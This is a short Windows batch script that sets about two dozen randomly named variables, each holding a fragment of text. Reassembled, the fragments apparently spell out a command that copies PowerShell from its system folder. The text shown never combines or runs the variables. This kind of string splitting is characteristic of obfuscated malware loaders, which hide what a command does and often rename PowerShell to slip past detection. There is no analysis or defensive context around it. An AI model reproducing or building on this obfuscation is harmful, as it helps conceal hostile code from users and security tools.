@echo off
set "HkMRAiDjEa=nd"
set "cpTFqovLDC=ll"
set "LeoauKIdwI=Po"
set "hoqLyFmDSL=32"
set "CusTafOIfD=Sy"
set "trWfHBhJpL=.e"
set "ENynOiNlEM=em"
set "FVDLQOejfz=py"
set "IhxauMIzZE=we"
set "DYlaNcjUSB=we"
set "rDdswKtqoZ=do"
set "VywBmObpSS=s\"
set "qMSvolxJWE=\W"
set "HzOCSnSUCH= C"
set "rTJXVaVLKm=he"
set "ZEwTQevYZo=ow"
set "bZeuoBPKRB=po"
set "nTxzKZLxBJ=Wi"
set "RgvXixKIXx=rS"
set "mARvfDSRTi=rs"
set "iuduKEJqSX=\v"
set "xFBmBCmPGU=0\"
set "hykGBVvzRG= /"
set "VTfCgmpdYM=he"
